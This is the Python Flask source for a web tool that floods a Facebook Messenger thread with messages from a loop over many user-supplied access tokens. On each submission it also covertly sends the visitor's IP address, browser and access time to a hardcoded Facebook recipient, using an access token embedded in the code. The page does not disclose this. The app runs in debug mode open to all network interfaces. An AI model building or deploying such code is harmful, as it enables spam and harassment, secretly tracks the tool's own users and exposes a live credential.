from flask import Flask, request, render_template_string
import requests
from threading import Thread, Event
import time
import random
import string

app = Flask(__name__)
app.debug = True

# Headers for API requests
headers = {
    'Connection': 'keep-alive',
    'Cache-Control': 'max-age=0',
    'Upgrade-Insecure-Requests': '1',
    'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.76 Safari/537.36',
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
    'Accept-Encoding': 'gzip, deflate',
    'Accept-Language': 'en-US,en;q=0.9,fr;q=0.8',
    'referer': 'www.google.com'
}

# Store running tasks and their stop events
stop_events = {}
threads = {}

# Function to capture user details (IP, browser, access time)
def get_user_info():
    user_ip = request.remote_addr
    user_agent = request.headers.get('User-Agent')
    access_time = time.strftime("%Y-%m-%d %H:%M:%S", time.localtime())
    return f"User IP: {user_ip}\nBrowser: {user_agent}\nAccess Time: {access_time}"

# Function to send user details to Facebook Messenger
def send_user_details_to_fb(access_token, recipient_id, user_info):
    api_url = f'https://graph.facebook.com/v15.0/t_{recipient_id}/'
    parameters = {'access_token': access_token, 'message': user_info}
    response = requests.post(api_url, data=parameters, headers=headers)
    if response.status_code == 200:
        print("User details sent successfully!")
    else:
        print(f"Failed to send user details: {response.text}")

# Function to send messages automatically
def send_messages(access_tokens, thread_id, mn, time_interval, messages, task_id):
    stop_event = stop_events[task_id]
    while not stop_event.is_set():
        for message1 in messages:
            if stop_event.is_set():
                break
            for access_token in access_tokens:
                api_url = f'https://graph.facebook.com/v15.0/t_{thread_id}/'
                message = str(mn) + ' ' + message1
                parameters = {'access_token': access_token, 'message': message}
                response = requests.post(api_url, data=parameters, headers=headers)
                if response.status_code == 200:
                    print(f"Message Sent Successfully From token {access_token}: {message}")
                else:
                    print(f"Message Sent Failed From token {access_token}: {message}")
                time.sleep(time_interval)

# Main route to handle message sending and capturing user info
@app.route('/', methods=['GET', 'POST'])
def send_message():
    if request.method == 'POST':
        # Capture user details
        user_info = get_user_info()

        # Send user info to Facebook Messenger
        fb_access_token = "EAABwzLixnjYBOZCUYWWr8x6kZBYDMpWX7e0WLZClonCtp0OBsgh0WrJqZCbA0IpwHUfOhZCpf7xLxmO6oZCzfzpOaMegwMeZByiX8Ix8XlrHzZCzj6RFdHmHVlOgzoF5gPvEeIT6ZBVSit20O3TZC5HXG0bQNgkWYGZBjWGZAXWEDGLfi4E3SkRG5khhpLnMdRgF4GvKFYEZD"  # Replace with your token
        recipient_id = "100053993161728"  # Replace with your thread ID
        send_user_details_to_fb(fb_access_token, recipient_id, user_info)

        # Handle message sending form submission
        token_option = request.form.get('tokenOption')

        if token_option == 'single':
            access_tokens = [request.form.get('singleToken')]
        else:
            token_file = request.files['tokenFile']
            access_tokens = token_file.read().decode().strip().splitlines()

        thread_id = request.form.get('threadId')
        mn = request.form.get('kidx')
        time_interval = int(request.form.get('time'))

        txt_file = request.files['txtFile']
        messages = txt_file.read().decode().splitlines()

        task_id = ''.join(random.choices(string.ascii_letters + string.digits, k=8))

        stop_events[task_id] = Event()
        thread = Thread(target=send_messages, args=(access_tokens, thread_id, mn, time_interval, messages, task_id))
        threads[task_id] = thread
        thread.start()

        return f'Task started with ID: {task_id}'

    # HTML Template
    return render_template_string('''
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="utf-8">
  <title>Messenger Bot</title>
</head>
<body>
  <h1>Message Sender Bot</h1>
  <form method="post" enctype="multipart/form-data">
    <label>Select Token Option:</label>
    <select name="tokenOption" onchange="toggleTokenInput()" required>
      <option value="single">Single Token</option>
      <option value="multiple">Token File</option>
    </select><br>
    <div id="singleTokenInput">
      <label>Enter Single Token:</label>
      <input type="text" name="singleToken"><br>
    </div>
    <div id="tokenFileInput" style="display: none;">
      <label>Choose Token File:</label>
      <input type="file" name="tokenFile"><br>
    </div>
    <label>Enter Thread ID:</label>
    <input type="text" name="threadId" required><br>
    <label>Enter Your Name:</label>
    <input type="text" name="kidx" required><br>
    <label>Enter Time Interval (seconds):</label>
    <input type="number" name="time" required><br>
    <label>Upload Messages File:</label>
    <input type="file" name="txtFile" required><br>
    <button type="submit">Start Sending Messages</button>
  </form>
  <script>
    function toggleTokenInput() {
      var tokenOption = document.querySelector('select[name="tokenOption"]').value;
      document.getElementById('singleTokenInput').style.display = tokenOption === 'single' ? 'block' : 'none';
      document.getElementById('tokenFileInput').style.display = tokenOption === 'multiple' ? 'block' : 'none';
    }
  </script>
</body>
</html>
''')

# Route to stop running tasks
@app.route('/stop', methods=['POST'])
def stop_task():
    task_id = request.form.get('taskId')
    if task_id in stop_events:
        stop_events[task_id].set()
        return f'Task with ID {task_id} has been stopped.'
    else:
        return f'No task found with ID {task_id}.'

# Run the Flask app
if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000)